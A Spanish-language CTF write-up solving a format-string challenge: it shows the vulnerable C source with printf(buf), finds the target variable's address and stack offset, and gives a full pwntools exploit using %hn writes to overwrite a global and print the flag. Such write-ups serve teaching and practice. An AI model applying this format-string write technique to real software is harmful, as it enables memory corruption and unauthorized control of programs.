#pwn #ctf #format_string

# Reconocimiento

Se nos da un binario y su código fuente:

```c
#include <stdio.h>

int sus = 0x21737573;

int main() {
char buf[1024];
char flag[64];

printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
fflush(stdout);
scanf("%1024s", buf);
printf("Here's your input: ");
printf(buf);
printf("\n");
fflush(stdout);

if (sus == 0x67616c66) {
	printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

	// Read in the flag
	FILE *fd = fopen("flag.txt", "r");
	fgets(flag, 64, fd);
	
	printf("%s", flag);
		fflush(stdout);
}
else {
	printf("sus = 0x%x\n", sus);
	printf("You can do better!\n");
	fflush(stdout);
}

	return 0;
}
```

Nos damos cuenta que es vulnerable a un [[Format string]]. Lo que debemos hacer es que la variable *sus* valga *`0x67616c66`*. Para ello debemos aprovecharnos de la vulnerabilidad.

# Explotación

Primero debemos ver dónde se guarda la variable *sus*, para ello utilizaremos [[readelf]]:

```bash
readelf -s vuln | grep sus
```
```bash
28: 0000000000404060     4 OBJECT  GLOBAL DEFAULT   25 sus
```

Además debemos ver dónde se guarda nuestro input. Si mandamos una cadena de `%x`:

```bash
./vuln
```
```vuln
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.
Here's your input: 402075.0.0.402073.19872a80.7dfecd80.198aa8c8.2.1989fb50.1.0.1.1989f160.252e7825.2e78252e.78252e78.252e7825.2e78252e.78252e78.252e7825.2e78252e.78252e78.252e7825.2e78252e.78252e78.252e7825.2e78252e.78252e78.0.0.1989f160.d.19872198.7dfed1e8.403e18.198d3020.198b0d3e.1.0.
sus = 0x21737573
You can do better!
```

Vemos que a partir de la posición 14 se empieza a repetir el valor *`252e7825`* (`%x`). Con esta información podemos crear un script con [[python]] y [[pwntools]] para resolver el reto:

```python
from pwn import *

binary = './vuln'
elf = ELF(binary)

def start():
    if args.REMOTE:
        return remote('saturn.picoctf.net', 53607)
    else: return process(binary)

# Lo primero es la dirección que tendremos que dividir en dos,
# ya que como tenemos que escribir ese numero de caracteres,
# hacerlo de una requeriria imprimir 404060 carcteres
addr_low = b'\x60\x40\x40\x00\x00\x00\x00\x00'
addr_high  = b'\x62\x40\x40\x00\x00\x00\x00\x00'

# Dividimos también el valor 0x67616c66
out_high = 0x6761
out_low  = 0x6c66

# Como los bytes altos son mayores, deberiamos escribir eso primero,
# ya que %n es acumulativo (imprimimos out_high caracteres y guardamos el valor,
# después los que quedan para out_low y guardamos).
n1 = out_high 
n2 = out_low - n1

# El ataque será algo así:
# %[value]c%[index]$[write_type][padding][address]
# 
# The padding is to align the addresses with the printf arguments (tienen que ser multiplos de 8).

#         first print & write    second print & write   padding    addr # 1    addr # 2
payload = b'%%%dx%%18$hn' % n1 + b'%%%dx%%19$hn' % n2 + b'\00'*7 + addr_high + addr_low
#%d -> añade n1 como un valor decimal ; %% -> representacion de %

r = start()

r.recvuntil(b'?\n')

r.sendline(payload)

r.recvline() # This line is going to be thousands of chars
print(r.recvall().decode())
```
> *`hn`* permite escribir de dos en dos bytes

Al ejecutarlo imprimirá la flag!